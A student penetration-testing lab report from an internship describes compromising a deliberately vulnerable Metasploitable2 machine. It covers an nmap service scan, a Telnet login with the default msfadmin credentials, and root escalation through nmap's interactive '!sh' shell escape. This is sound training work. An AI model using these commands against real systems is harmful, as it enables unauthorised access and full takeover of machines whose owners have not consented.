#  Cybersecurity Lab Report

**Internship:** APEX PLANET
**Task:** 01 – Build a Hacking Lab & Perform Exploitation

---

##  Objective

To build a penetration testing lab environment and perform vulnerability assessment, exploitation, and privilege escalation on a vulnerable system.


## Lab Setup

###  Attacker Machine

* Kali Linux (UTM Virtual Machine)

###  Target Machine

* Metasploitable2 (Vulnerable Linux System)


##  Network Configuration

* Network Type: Host-Only
* Kali Linux IP: 192.168.128.X
* Target IP: 192.168.128.3


##  Phase 1: Reconnaissance & Scanning

### Command Used:

nmap -A 192.168.128.3

### Key Findings:

* Multiple open ports detected
* Services identified:

  * FTP (vsftpd 2.3.4)
  * Telnet
  * SMB (Samba 3.0.20)
  * HTTP (Apache 2.2.8)


##  Phase 2: Exploitation (Initial Access)

Used Telnet service with default credentials:

telnet 192.168.128.3

Credentials:

Username: msfadmin
Password: msfadmin

### Result:

* Successfully gained access to target system as low-privilege user


##  Phase 3: Privilege Escalation

Used vulnerable Nmap interactive mode:

nmap --interactive
!sh


### Result:
whoami → root

* Full administrative (root) access obtained

##  Final Outcome

* Successfully compromised the system
* Achieved root-level access
* Demonstrated complete attack lifecycle


##  Key Learnings

* Importance of network scanning and enumeration
* Risks of weak/default credentials
* Real-world exploitation workflow
* Privilege escalation techniques
* Difference between automated and manual exploitation


##  Ethical Note

This lab was conducted in a controlled environment using intentionally vulnerable systems.
No real systems were harmed.


##  Conclusion

This lab provided hands-on experience in penetration testing, from reconnaissance to full system compromise. It highlights how misconfigurations and weak security practices can lead to critical vulnerabilities.


